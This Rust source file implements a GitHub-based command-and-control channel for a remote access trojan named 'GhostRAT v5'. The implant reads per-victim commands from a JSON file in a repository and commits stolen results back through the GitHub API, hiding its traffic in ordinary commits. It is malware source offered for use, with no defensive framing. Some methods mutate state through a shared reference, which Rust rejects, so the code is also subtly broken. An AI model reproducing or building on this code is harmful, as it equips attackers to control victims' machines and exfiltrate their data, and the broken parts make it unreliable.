//! GitHub API Commit C2 channel.
//!
//! Uses a JSON file in the repository as the command/result store.
//! Commands are written to commands.json, results to results.json.
//! The implant polls the file and commits changes atomically.

use crate::c2::{C2Channel, C2Error, Command};
use serde::{Deserialize, Serialize};
use tracing::{debug, info};

const GITHUB_API_BASE: &str = "https://api.github.com";

/// GitHub API Commit C2 channel
pub struct GitHubApiC2 {
    repo_owner: String,
    repo_name: String,
    token: String,
    file_path: String,
    last_sha: Option<String>,
    available: bool,
}

#[derive(Debug, Deserialize)]
struct GitHubContentResponse {
    content: String,
    sha: String,
    download_url: Option<String>,
}

#[derive(Debug, Serialize)]
struct GitHubPutRequest {
    message: String,
    content: String,
    sha: String,
    branch: Option<String>,
}

/// Commands stored in the GitHub file
#[derive(Debug, Deserialize, Serialize)]
struct CommandStore {
    pub commands: Vec<ParsedCommand>,
}

#[derive(Debug, Deserialize, Serialize)]
struct ParsedCommand {
    pub victim_id: String,
    pub cmd_type: u8,
    pub data: String, // base64 encoded
    pub encrypted: bool,
    pub crypto_key: String,
}

/// Results stored in the GitHub file
#[derive(Debug, Deserialize, Serialize, Default)]
struct ResultStore {
    pub results: Vec<ResultEntry>,
}

#[derive(Debug, Deserialize, Serialize)]
struct ResultEntry {
    pub victim_id: String,
    pub cmd_type: u8,
    pub data: String, // base64 encoded
    pub timestamp: String,
}

impl GitHubApiC2 {
    pub fn new(repo_owner: String, repo_name: String, token: String, file_path: String) -> Self {
        Self {
            repo_owner,
            repo_name,
            token,
            file_path,
            last_sha: None,
            available: true,
        }
    }

    fn auth_headers(&self) -> std::collections::HashMap<String, String> {
        let mut headers = std::collections::HashMap::new();
        headers.insert("Authorization".to_string(), format!("Bearer {}", self.token));
        headers.insert("Accept".to_string(), "application/vnd.github.v3+json".to_string());
        headers
    }

    async fn github_request(
        &self,
        method: &str,
        url: &str,
        body: Option<&serde_json::Value>,
    ) -> Result<String, C2Error> {
        let client = reqwest::Client::new();
        let mut request = client.request(method.parse().unwrap_or(reqwest::Method::GET), url);
        for (k, v) in &self.auth_headers() {
            request = request.header(k, v);
        }
        if let Some(body) = body {
            request = request.json(body);
        }

        let response = match request.send().await {
            Ok(r) => r,
            Err(e) => {
                debug!("GitHub request failed: {}", e);
                self.available = false;
                return Err(C2Error::Unreachable);
            }
        };

        let status = response.status();
        if !status.is_success() {
            let text = response.text().await.unwrap_or_default();
            if status == 404 {
                return Err(C2Error::Other("File not found".to_string()));
            }
            return Err(C2Error::Other(format!("GitHub API {}: {}", status, text)));
        }

        response.text().await.map_err(C2Error::Http)
    }
}

#[async_trait::async_trait]
impl C2Channel for GitHubApiC2 {
    fn name(&self) -> &str {
        "github-api"
    }

    async fn poll_commands(&self) -> Result<Vec<Command>, C2Error> {
        let url = format!("{}/repos/{}/{}/contents/{}",
            GITHUB_API_BASE, self.repo_owner, self.repo_name, self.file_path);

        let content_text = self.github_request("GET", &url, None).await?;
        let content: GitHubContentResponse = serde_json::from_str(&content_text)
            .map_err(|e| C2Error::Parse(e))?;

        // Check if file has changed
        if Some(&content.sha) == &self.last_sha {
            return Ok(Vec::new());
        }
        self.last_sha = Some(content.sha.clone());

        // Decode base64 content
        let decoded = base64::decode(&content.content)
            .map_err(|e| C2Error::Other(format!("Failed to decode content: {}", e)))?;

        // Parse command store
        let store: CommandStore = serde_json::from_slice(&decoded)
            .unwrap_or(CommandStore { commands: Vec::new() });

        let mut commands = Vec::new();
        for pc in store.commands {
            let data = base64::decode(&pc.data).unwrap_or_default();
            commands.push(Command {
                victim_id: pc.victim_id,
                cmd_type: pc.cmd_type,
                data,
                encrypted: pc.encrypted,
                crypto_key: pc.crypto_key,
            });
        }

        Ok(commands)
    }

    async fn send_result(&self, victim_id: &str, result: &[u8]) -> Result<(), C2Error> {
        let url = format!("{}/repos/{}/{}/contents/{}",
            GITHUB_API_BASE, self.repo_owner, self.repo_name, self.file_path);

        // Get current content
        let content_text = self.github_request("GET", &url, None).await?;
        let content: GitHubContentResponse = serde_json::from_str(&content_text)
            .map_err(|e| C2Error::Parse(e))?;

        // Parse existing results
        let decoded = base64::decode(&content.content)
            .map_err(|e| C2Error::Other(format!("Failed to decode: {}", e)))?;
        let mut store: ResultStore = serde_json::from_slice(&decoded).unwrap_or_default();

        // Append new result
        store.results.push(ResultEntry {
            victim_id: victim_id.to_string(),
            cmd_type: 0xFF, // result marker
            data: base64::encode(result),
            timestamp: chrono::Utc::now().to_rfc3339(),
        });

        // Commit changes
        let new_content = base64::encode(serde_json::to_string(&store).unwrap_or_default());
        let put_body = serde_json::json!({
            "message": format!("GhostRAT v5 result from {}", victim_id),
            "content": new_content,
            "sha": content.sha,
        });

        self.github_request("PUT", &url, Some(&put_body)).await?;

        Ok(())
    }

    fn is_available(&self) -> bool {
        self.available
    }
}
